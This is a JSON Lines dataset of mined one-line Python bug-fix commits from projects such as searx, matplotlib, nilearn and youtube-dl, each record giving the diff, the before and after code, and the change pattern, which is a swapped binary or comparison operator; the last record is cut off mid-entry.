{"project": "searx", "commit_sha": "664c039b387d6c50f09e27de36f794821c101fd9", "parent_sha": "9eddcdb8e4cc8ce673ef07be9f26162ed6f89b93", "file_path": "searx/engines/xpath.py", "project_url": "https://github.com/MarcAbonce/searx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def extract_url(xpath_results):\n             url = xpath_results[0].attrib.get('href')\n     else:\n         url = xpath_results.attrib.get('href')\n-    if not url.startswith('http://') or not url.startswith('https://'):\n+    if not url.startswith('http://') and not url.startswith('https://'):\n         url = 'http://'+url\n     parsed_url = urlparse(url)\n     if not parsed_url.netloc:\n", "before": "if not url . startswith ( 'http://' ) or not url . startswith ( 'https://' ) : url = 'http://' + url", "after": "if not url . startswith ( 'http://' ) and not url . startswith ( 'https://' ) : url = 'http://' + url", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 71], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 38, 3, 40]]]"}
{"project": "searx", "commit_sha": "9d537c0bad5b68f9c83ea4ac026d22a27264b8dd", "parent_sha": "c4dd7c3a549e238c82a3274bb66ba17386076a10", "file_path": "searx/engines/kickass.py", "project_url": "https://github.com/MarcAbonce/searx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ def response(resp):\n \n     # check if redirect comparing to the True value,\n     # because resp can be a Mock object, and any attribut name returns something.\n-    if resp.is_redirect == True:\n+    if resp.is_redirect is True:\n         return results\n \n     dom = html.fromstring(resp.text)\n", "before": "if resp . is_redirect == True : return results", "after": "if resp . is_redirect is True : return results", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 32], [\"is:is\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 25, 3, 27]]]"}
{"project": "matplotlib", "commit_sha": "4d3b23abe1928d22ac9c3531f6415d1c1c1f9247", "parent_sha": "687f1f8e2637a7f2a54d069902996151261dd246", "file_path": "lib/matplotlib/tests/test_simplification.py", "project_url": "https://github.com/story645/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -153,7 +153,7 @@ AAj1//+nPwAA/////w==\"\"\"\n         decodebytes = base64.decodestring\n \n     verts = np.fromstring(decodebytes(data), dtype='<i4')\n-    verts = verts.reshape((len(verts) / 2, 2))\n+    verts = verts.reshape((len(verts) // 2, 2))\n     path = Path(verts)\n     segs = path.iter_segments(transforms.IdentityTransform(), clip=(0.0, 0.0, 100.0, 100.0))\n     segs = list(segs)\n", "before": "verts = verts . reshape ( ( len ( verts ) / 2 , 2 ) )", "after": "verts = verts . reshape ( ( len ( verts ) // 2 , 2 ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 28, 3, 42], [\"//://\", \"T\"], 1], [\"Delete\", [\"/:/\", 3, 39, 3, 40]]]"}
{"project": "matplotlib", "commit_sha": "038b3ff6dc7ca073cca02d60e05e055169c8f09a", "parent_sha": "42055bd2c77b60ef244f5f9a52b9ce90778b4931", "file_path": "lib/matplotlib/backends/backend_agg.py", "project_url": "https://github.com/story645/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -155,7 +155,7 @@ class RendererAgg(RendererBase):\n \n         xd = descent * np.sin(np.deg2rad(angle))\n         yd = descent * np.cos(np.deg2rad(angle))\n-        x = np.round(x + ox - xd)\n+        x = np.round(x + ox + xd)\n         y = np.round(y - oy + yd)\n         self._renderer.draw_text_image(font_image, x, y + 1, angle, gc)\n \n", "before": "x = np . round ( x + ox - xd )", "after": "x = np . round ( x + ox + xd )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 22, 3, 33], [\"+:+\", \"T\"], 1], [\"Delete\", [\"-:-\", 3, 29, 3, 30]]]"}
{"project": "matplotlib", "commit_sha": "e62832fa8d51eac14553e09aa704e1c6d707bada", "parent_sha": "cd0e7e07024f9b561737301db5f037741a40f36a", "file_path": "lib/matplotlib/tests/test_agg.py", "project_url": "https://github.com/story645/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -251,7 +251,7 @@ def test_agg_filter():\n             t2 = self.offset_filter.process_image(t1, dpi)\n             return t2\n \n-    if V(np.__version__) <= V('1.7.0'):\n+    if V(np.__version__) < V('1.7.0'):\n         return\n \n     fig = plt.figure()\n", "before": "if V ( np . __version__ ) <= V ( '1.7.0' ) : return", "after": "if V ( np . __version__ ) < V ( '1.7.0' ) : return", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 39], [\"<:<\", \"T\"], 1], [\"Delete\", [\"<=:<=\", 3, 26, 3, 28]]]"}
{"project": "bedparse", "commit_sha": "677954436f694335c80f76a98081a76ce5fd44df", "parent_sha": "02cf42148e2f8cf88b8f504c00105e3c29f26b01", "file_path": "bedparse/bedLine.py", "project_url": "https://github.com/tleonardi/bedparse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -271,17 +271,19 @@ class bedLine(object):\n         \"\"\" Given a position in transcript coordinates returns the equivalent in genome coordinates\"\"\"\n         exStarts=self.exStarts.split(',')\n         exLens=self.exLengths.split(',')\n-        if(coord==0):\n+        if(coord<=0):\n             startGenome=self.start\n         else:\n             cumLen=0\n             i=0 \n+            #print(\"CumLen: %s Coord: %s\" %(cumLen, coord))\n             while cumLen < coord: \n                 cumLen+=int(exLens[i])\n                 i+=1\n                 if(i>=self.nEx):\n                     break\n             startEx=i-1\n+            #print(\"startEx=\",startEx)\n             exonStartOffset=int(exLens[startEx])-(cumLen-coord)\n             startGenome=self.start+int(exStarts[startEx])+exonStartOffset\n         return startGenome\n", "before": "if ( coord == 0 ) : startGenome = self . start else : cumLen = 0 i = 0 while cumLen < coord : cumLen += int ( exLens [ i ] ) i += 1 if ( i >= self . nEx ) : break startEx = i - 1 exonStartOffset = int ( exLens [ startEx ] ) - ( cumLen - coord ) startGenome = self . start + int ( exStarts [ startEx ] ) + exonStartOffset", "after": "if ( coord <= 0 ) : startGenome = self . start else : cumLen = 0 i = 0 while cumLen < coord : cumLen += int ( exLens [ i ] ) i += 1 if ( i >= self . nEx ) : break startEx = i - 1 exonStartOffset = int ( exLens [ startEx ] ) - ( cumLen - coord ) startGenome = self . start + int ( exStarts [ startEx ] ) + exonStartOffset", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 20], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 17, 3, 19]]]"}
{"project": "pytorch", "commit_sha": "0308910c58cb2c1765aad1dc64b613ba7b527f5d", "parent_sha": "a109cbdfb6cffe3085f3d3b3d27802e2e7b098de", "file_path": "caffe2/python/schema.py", "project_url": "https://github.com/ezyang/pytorch", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -545,7 +545,7 @@ def RawTuple(num_fields):\n     assert isinstance(num_fields, int)\n-    assert num_fields > 0\n+    assert num_fields >= 0\n     return Tuple(*([np.void] * num_fields))\n \n \n", "before": "assert num_fields > 0", "after": "assert num_fields >= 0", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 1, 12, 1, 26], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 1, 23, 1, 24]]]"}
{"project": "iterative-Random-Forest", "commit_sha": "c57fae8505fc58d9a3c8961227368a7e86422a56", "parent_sha": "cb629ec070804d7cf0063796778720390a269598", "file_path": "sklearn/metrics/metrics.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -578,7 +578,7 @@ def precision_recall_curve(y_true, probas_pred):\n     precision = np.empty(n_thresholds)\n     recall = np.empty(n_thresholds)\n     for i, t in enumerate(thresholds):\n-        y_pred = (probas_pred > t).astype(np.int)\n+        y_pred = (probas_pred >= t).astype(np.int)\n         p, r, _, _ = precision_recall_fscore_support(y_true, y_pred)\n         precision[i] = p[1]\n         recall[i] = r[1]\n", "before": "y_pred = ( probas_pred > t ) . astype ( np . int )", "after": "y_pred = ( probas_pred >= t ) . astype ( np . int )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 19, 3, 34], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 31, 3, 32]]]"}
{"project": "iterative-Random-Forest", "commit_sha": "8f1dd3216f7c99477edc8be26b0590508e63d394", "parent_sha": "a36c72a8bef063a70ef5b85ce399c211e8977c3c", "file_path": "sklearn/gaussian_process/gaussian_process.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ def l1_cross_distances(X):\n     X = array2d(X)\n     n_samples, n_features = X.shape\n-    n_nonzero_cross_dist = n_samples * (n_samples - 1) / 2\n+    n_nonzero_cross_dist = n_samples * (n_samples - 1) // 2\n     ij = np.zeros((n_nonzero_cross_dist, 2), dtype=np.int)\n     D = np.zeros((n_nonzero_cross_dist, n_features))\n     ll_1 = 0\n", "before": "n_nonzero_cross_dist = n_samples * ( n_samples - 1 ) / 2", "after": "n_nonzero_cross_dist = n_samples * ( n_samples - 1 ) // 2", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 2, 28, 2, 59], [\"//://\", \"T\"], 1], [\"Delete\", [\"/:/\", 2, 56, 2, 57]]]"}
{"project": "iterative-Random-Forest", "commit_sha": "33ae502c52ea95812abec8b38dcc7ee0f22cf1c1", "parent_sha": "cb587005749d3d37293b724f9ef3ee9b46c02a5a", "file_path": "sklearn/covariance/graph_lasso_.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ def _objective(mle, precision_, alpha):\n     # the objective function is made of a shifted scaled version of the \n     # normalized log-likelihood (i.e. its empirical mean over the samples)\n     p = precision_.shape[0]\n-    cost = - 2. * log_likelihood(mle, precision_) + p * np.log(2 * np.pi)\n+    cost = - 2. * log_likelihood(mle, precision_) - p * np.log(2 * np.pi)\n     cost += alpha * (np.abs(precision_).sum()\n                      - np.abs(np.diag(precision_)).sum())\n     return cost\n", "before": "cost = - 2. * log_likelihood ( mle , precision_ ) + p * np . log ( 2 * np . pi )", "after": "cost = - 2. * log_likelihood ( mle , precision_ ) - p * np . log ( 2 * np . pi )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 12, 3, 74], [\"-:-\", \"T\"], 1], [\"Delete\", [\"+:+\", 3, 51, 3, 52]]]"}
{"project": "cpymad", "commit_sha": "423f90d1ca85486b649a566f78723b5b11ed4490", "parent_sha": "cca97bf49b403369bafd35f92c91c87118fa76ee", "file_path": "src/cern/cpymad/_libmadx_rpc.py", "project_url": "https://github.com/hibtc/cpymad", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ def _close_all_but(keep):\n     # close all ranges in between the file descriptors to be kept:\n     keep = sorted(set([-1] + keep + [MAXFD]))\n     for s, e in zip(keep[:-1], keep[1:]):\n-        if s+1 > e:\n+        if s+1 < e:\n             os.closerange(s+1, e)\n \n def remap_stdio():\n", "before": "if s + 1 > e : os . closerange ( s + 1 , e )", "after": "if s + 1 < e : os . closerange ( s + 1 , e )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 19], [\"<:<\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 16, 3, 17]]]"}
{"project": "puq", "commit_sha": "6d9f75ff0a8e1b2500592ef093698852ccc162b9", "parent_sha": "711811a319f277fabdf424104a3aa97bbe308f48", "file_path": "puq/smolyak_funcs.py", "project_url": "https://github.com/c-PRIMED/puq", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ def index_step1(m):\n         for i in range(0, cols):\n             z = row.copy()\n             z[i] += 1\n-            if out == None:\n+            if out is None:\n                 out = array([z])\n             else:\n                 copy = True\n", "before": "if out == None : out = array ( [ z ] ) else : copy = True", "after": "if out is None : out = array ( [ z ] ) else : copy = True", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 27], [\"is:is\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 20, 3, 22]]]"}
{"project": "-", "commit_sha": "edcf6d54b6304d3e3bead3b1d2d7d14d04b70aab", "parent_sha": "aa8485b4dff800b7cc5d65f8a84fb7bc71f9e0a1", "file_path": "sorts/radix_sort.py", "project_url": "https://github.com/XiaoruiZhangGOD/-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2,19 +2,19 @@ def radixsort(lst):\n   RADIX = 10\n   maxLength = False\n   tmp , placement = -1, 1\n- \n+\n   while not maxLength:\n     maxLength = True\n     # declare and initialize buckets\n     buckets = [list() for _ in range( RADIX )]\n- \n+\n     # split lst between lists\n     for  i in lst:\n-      tmp = i / placement\n+      tmp = i // placement\n       buckets[tmp % RADIX].append( i )\n       if maxLength and tmp > 0:\n         maxLength = False\n- \n+\n     # empty lists into lst array\n     a = 0\n", "before": "tmp = i / placement", "after": "tmp = i // placement", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 11, 13, 11, 26], [\"//://\", \"T\"], 1], [\"Delete\", [\"/:/\", 11, 15, 11, 16]]]"}
{"project": "Minecraft-Overviewer", "commit_sha": "b9a21b98e00caecbf4a47158cd86c0c583973824", "parent_sha": "dfe30a0d0f036ed563765b5f7f34457a02f3f151", "file_path": "optimizeimages.py", "project_url": "https://github.com/SkyPrayerStudio/Minecraft-Overviewer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ def check_programs(level):\n     \n     for prog,l in [(pngcrush,1), (optipng,2), (advdef,2)]:\n         if l <= level:\n-            if (not exists_in_path(prog)) or (not exists_in_path(prog + \".exe\")):\n+            if (not exists_in_path(prog)) and (not exists_in_path(prog + \".exe\")):\n                 raise Exception(\"Optimization prog %s for level %d not found!\" % (prog, l))\n \n def optimize_image(imgpath, imgformat, optimizeimg):\n", "before": "if ( not exists_in_path ( prog ) ) or ( not exists_in_path ( prog + \".exe\" ) ) : raise Exception ( \"Optimization prog %s for level %d not found!\" % ( prog , l ) )", "after": "if ( not exists_in_path ( prog ) ) and ( not exists_in_path ( prog + \".exe\" ) ) : raise Exception ( \"Optimization prog %s for level %d not found!\" % ( prog , l ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 81], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 43, 3, 45]]]"}
{"project": "snetcam", "commit_sha": "3db6cd41455c3d2258848e5f421fe91e44f3562a", "parent_sha": "69c3ae5ebd2f3f55a60e61139f83fa4ce6fc758f", "file_path": "snetcam/recognitionserver2.py", "project_url": "https://github.com/tripzero/snetcam", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -195,7 +195,7 @@ class RecognitionServer(Server):\n \t\treply_user_list = []\n \n \t\tfor user in users:\n-\t\t\tif user.level == level:\n+\t\t\tif user.level >= level:\n \t\t\t\treply_user_list.append(user.to_json())\n \n \t\tprint(\"replying to list_users_with level with ({}) users\".format(len(reply_user_list)))\n", "before": "if user . level == level : reply_user_list . append ( user . to_json ( ) )", "after": "if user . level >= level : reply_user_list . append ( user . to_json ( ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 7, 3, 26], [\">=:>=\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 18, 3, 20]]]"}
{"project": "nilearn", "commit_sha": "4e7a05d5d4f94373fab25568db2b6a0e44cc0820", "parent_sha": "597894a02778c154fb31153666ac0a5db6b64826", "file_path": "nisl/utils.py", "project_url": "https://github.com/hanke/nilearn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -337,7 +337,7 @@ class CacheMixin(object):\n                               \"Setting memory_level to 1.\")\n                 self.memory_level = 1\n \n-        if self.memory_level < memory_level:\n+        if self.memory_level >= memory_level:\n             mem = Memory(cachedir=None)\n             return mem.cache(func, **kwargs)\n         else:\n", "before": "if self . memory_level < memory_level : mem = Memory ( cachedir = None ) return mem . cache ( func , ** kwargs ) else : ", "after": "if self . memory_level >= memory_level : mem = Memory ( cachedir = None ) return mem . cache ( func , ** kwargs ) else : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 44], [\">=:>=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 30, 3, 31]]]"}
{"project": "nilearn", "commit_sha": "c353b70020580a25ba7c6043ea27befe2ddd2787", "parent_sha": "c79f561a00f499ea37058c22337a4cd4fe199d0f", "file_path": "nisl/tests/test_masking.py", "project_url": "https://github.com/hanke/nilearn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -206,7 +206,7 @@ def test_unmask():\n \n     # Error test\n     dummy = generator.rand(500)\n-    if np_version > [1, 8, 0]:\n+    if np_version >= [1, 8, 0]:\n         assert_raises(IndexError, unmask, dummy, mask_img)\n         assert_raises(IndexError, unmask, [dummy], mask_img)\n     else:\n", "before": "if np_version > [ 1 , 8 , 0 ] : assert_raises ( IndexError , unmask , dummy , mask_img ) assert_raises ( IndexError , unmask , [ dummy ] , mask_img ) else : ", "after": "if np_version >= [ 1 , 8 , 0 ] : assert_raises ( IndexError , unmask , dummy , mask_img ) assert_raises ( IndexError , unmask , [ dummy ] , mask_img ) else : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 30], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 19, 3, 20]]]"}
{"project": "nilearn", "commit_sha": "1f220c7d804c245ae3580fb7cfbc87ebca7a5845", "parent_sha": "725fa96ab37cdf03b3b252157c22aa7d47139327", "file_path": "nisl/_utils/cache_mixin.py", "project_url": "https://github.com/hanke/nilearn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -132,7 +132,7 @@ class CacheMixin(object):\n                 self.memory_level = 1\n         verbose = getattr(self, 'verbose', 0)\n \n-        if self.memory_level <= memory_level:\n+        if self.memory_level < memory_level:\n             mem = Memory(cachedir=None, verbose=verbose)\n             return mem.cache(func, **kwargs)\n         else:\n", "before": "if self . memory_level <= memory_level : mem = Memory ( cachedir = None , verbose = verbose ) return mem . cache ( func , ** kwargs ) else : ", "after": "if self . memory_level < memory_level : mem = Memory ( cachedir = None , verbose = verbose ) return mem . cache ( func , ** kwargs ) else : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 45], [\"<:<\", \"T\"], 1], [\"Delete\", [\"<=:<=\", 3, 30, 3, 32]]]"}
{"project": "pyethereum", "commit_sha": "42d47ec8e918b984517b2daa123f905d250a8cc4", "parent_sha": "8f562d39b4ac09a3e4ff082f5f3657b6b4880b57", "file_path": "pyethereum/tester.py", "project_url": "https://github.com/ethermarket/pyethereum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class state():\n         if not s:\n             raise Exception(\"Transaction failed\")\n         o = serpent.decode_datalist(r)\n-        return map(lambda x: x-2**256 if x > 2**255 else x, o)\n+        return map(lambda x: x-2**256 if x >= 2**255 else x, o)\n \n     def profile(self, sender, to, value, data=[], funid=None, abi=None):\n         tm, g = time.time(), self.block.gas_used\n", "before": "return map ( lambda x : x - 2 ** 256 if x > 2 ** 255 else x , o )", "after": "return map ( lambda x : x - 2 ** 256 if x >= 2 ** 255 else x , o )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 42, 3, 52], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 44, 3, 45]]]"}
{"project": "kivy", "commit_sha": "4409484f40b2d113adb4f36cf10073c8893be4d4", "parent_sha": "e46dffcdf1c9963efa56c5a492dddf976c3a4d42", "file_path": "kivy/core/audio/audio_gstreamer.py", "project_url": "https://github.com/jofomah/kivy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class SoundGstreamer(Sound):\n         if self._data is None:\n             return\n         self._data.seek_simple(gst.FORMAT_TIME, gst.SEEK_FLAG_SKIP,\n-                               position / 1000000000.)\n+                               position * 1000000000.)\n \n     def get_pos(self):\n         if self._data is not None:\n", "before": "self . _data . seek_simple ( gst . FORMAT_TIME , gst . SEEK_FLAG_SKIP , position / 1000000000. )", "after": "self . _data . seek_simple ( gst . FORMAT_TIME , gst . SEEK_FLAG_SKIP , position * 1000000000. )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 32, 3, 54], [\"*:*\", \"T\"], 1], [\"Delete\", [\"/:/\", 3, 41, 3, 42]]]"}
{"project": "nilearn", "commit_sha": "6b3ed64427afda135345f553ad063f455c256cb4", "parent_sha": "ffd7e2abd6a8c52482e838d3a3062ece8f60b061", "file_path": "nilearn/mass_univariate/tests/test_gsarray.py", "project_url": "https://github.com/hanke/nilearn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ def test_gsarray_merge():\n     gsarray2 = GrowableSparseArray(n_iter=1, threshold=0)  # lower threshold\n     with warnings.catch_warnings(True) as warning:\n         gsarray2.merge(gsarray)\n-        assert(len(warning) > 1)\n+        assert(len(warning) >= 1)\n         assert(isinstance(warning[0], warnings.WarningMessage))\n     assert_array_equal(\n         gsarray.get_data()['iter_id'], gsarray2.get_data()['iter_id'])\n", "before": "assert ( len ( warning ) > 1 )", "after": "assert ( len ( warning ) >= 1 )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 32], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 29, 3, 30]]]"}
{"project": "youtube-dl", "commit_sha": "6e74bc41ca07bda56107cfff9ceb98d6f8d28e53", "parent_sha": "cba892fa1fd6a7f1278e637c338921c5ae236840", "file_path": "youtube_dl/aes.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ def aes_ctr_decrypt(data, key, counter):\n     expanded_key = key_expansion(key)\n-    block_count = int(ceil(float(len(data)) // BLOCK_SIZE_BYTES))\n+    block_count = int(ceil(float(len(data)) / BLOCK_SIZE_BYTES))\n     \n     decrypted_data=[]\n     for i in range(block_count):\n", "before": "block_count = int ( ceil ( float ( len ( data ) ) // BLOCK_SIZE_BYTES ) )", "after": "block_count = int ( ceil ( float ( len ( data ) ) / BLOCK_SIZE_BYTES ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 1, 28, 1, 64], [\"/:/\", \"T\"], 1], [\"Delete\", [\"//://\", 1, 45, 1, 47]]]"}
{"project": "youtube-dl", "commit_sha": "83442966194640d9bc00e7f3086aa5e8b25c4ae3", "parent_sha": "a94e7f4a0ca333aabf08adb1c329b4b5b8a5d897", "file_path": "youtube_dl/socks.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ class ProxyError(IOError):\n \n     def __init__(self, code=None, msg=None):\n         if code is not None and msg is None:\n-            msg = self.CODES.get(code) and 'unknown error'\n+            msg = self.CODES.get(code) or 'unknown error'\n         super(ProxyError, self).__init__(code, msg)\n \n \n", "before": "msg = self . CODES . get ( code ) and 'unknown error'", "after": "msg = self . CODES . get ( code ) or 'unknown error'", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 19, 3, 59], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 40, 3, 43]]]"}
{"project": "gym-cribbage", "commit_sha": "37be77ddd28b81a4e1a47965ef23b94922a505a0", "parent_sha": "0660393f207da404fc32fa7be24f38fa11a69481", "file_path": "src/gym_cribbage/envs/cribbage_env.py", "project_url": "https://github.com/atremblay/gym-cribbage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -485,7 +485,7 @@ class CribbageEnv(gym.Env):\n             self.prev_phase = 2\n \n         # If any player, at any time, gets a winning amount of points.\n-        if any(self.scores > MAX_ROUND_VALUE):\n+        if any(self.scores >= MAX_ROUND_VALUE):\n             done = True\n \n             # Forces user to reset the environment for the next game.\n", "before": "if any ( self . scores > MAX_ROUND_VALUE ) : done = True", "after": "if any ( self . scores >= MAX_ROUND_VALUE ) : done = True", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 45], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 28, 3, 29]]]"}
{"project": "pep.py", "commit_sha": "78dbd7e1f59a6aabcb0c4fbc870fb2fc12c89332", "parent_sha": "649c4008832c35c2e2b021c90e6207246630c845", "file_path": "handlers/apiIsOnlineHandler.py", "project_url": "https://github.com/kawatapw/pep.py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ class handler(requestHelper.asyncRequestHandler):\n \t\tdata = {\"message\": \"unknown error\"}\n \t\ttry:\n \t\t\t# Check arguments\n-\t\t\tif \"u\" not in self.request.arguments and \"id\" not in self.request.arguments:\n+\t\t\tif \"u\" not in self.request.arguments or \"id\" not in self.request.arguments:\n \t\t\t\traise exceptions.invalidArgumentsException()\n \n \t\t\t# Get online staus\n", "before": "if \"u\" not in self . request . arguments and \"id\" not in self . request . arguments : raise exceptions . invalidArgumentsException ( )", "after": "if \"u\" not in self . request . arguments or \"id\" not in self . request . arguments : raise exceptions . invalidArgumentsException ( )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 7, 3, 79], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 41, 3, 44]]]"}
{"project": "pep.py", "commit_sha": "bd395ef30bf6dce64547b7d9b14446e189151f5d", "parent_sha": "78dbd7e1f59a6aabcb0c4fbc870fb2fc12c89332", "file_path": "handlers/apiIsOnlineHandler.py", "project_url": "https://github.com/kawatapw/pep.py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ class handler(requestHelper.asyncRequestHandler):\n \t\tdata = {\"message\": \"unknown error\"}\n \t\ttry:\n \t\t\t# Check arguments\n-\t\t\tif \"u\" not in self.request.arguments or \"id\" not in self.request.arguments:\n+\t\t\tif \"u\" not in self.request.arguments and \"id\" not in self.request.arguments:\n \t\t\t\traise exceptions.invalidArgumentsException()\n \n \t\t\t# Get online staus\n", "before": "if \"u\" not in self . request . arguments or \"id\" not in self . request . arguments : raise exceptions . invalidArgumentsException ( )", "after": "if \"u\" not in self . request . arguments and \"id\" not in self . request . arguments : raise exceptions . invalidArgumentsException ( )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 7, 3, 78], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 41, 3, 43]]]"}
{"project": "cov-core", "commit_sha": "1e7a2f25bd8c12d41ffe43647bcbc2568abebfe4", "parent_sha": "6d28bac17cd973028ab600a742f04a878bcea4d7", "file_path": "cov_core.py", "project_url": "https://github.com/balanced/cov-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ class CovController(object):\n             stream.sep(s, txt)\n         else:\n             sep_total = max((70 - 2 - len(txt)), 2)\n-            sep_len = sep_total / 2\n+            sep_len = sep_total // 2\n             sep_extra = sep_total % 2\n             out = '%s %s %s\\n' % (s * sep_len, txt, s * (sep_len + sep_extra))\n             stream.write(out)\n", "before": "sep_len = sep_total / 2", "after": "sep_len = sep_total // 2", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 23, 3, 36], [\"//://\", \"T\"], 1], [\"Delete\", [\"/:/\", 3, 33, 3, 34]]]"}
{"project": "intermine-ws-client.py", "commit_sha": "b87555b20ee5ebe04a26421f11e31bb1338e7996", "parent_sha": "9598000600de3f3bc3f751233dd1f72e9b13ec50", "file_path": "intermine/registry.py", "project_url": "https://github.com/intermine/intermine-ws-client.py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -108,7 +108,7 @@ def getMines(organism=None):\n     count = 0\n     dict = json.loads(r.text)\n     for i in range(len(dict[\"instances\"])):\n-        if organism == None:\n+        if organism is None:\n             print(dict[\"instances\"][i][\"name\"])\n             count = count+1\n         else:\n", "before": "if organism == None : print ( dict [ \"instances\" ] [ i ] [ \"name\" ] ) count = count + 1 else : ", "after": "if organism is None : print ( dict [ \"instances\" ] [ i ] [ \"name\" ] ) count = count + 1 else : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 28], [\"is:is\", \"T\"], 1], [\"Delete\", 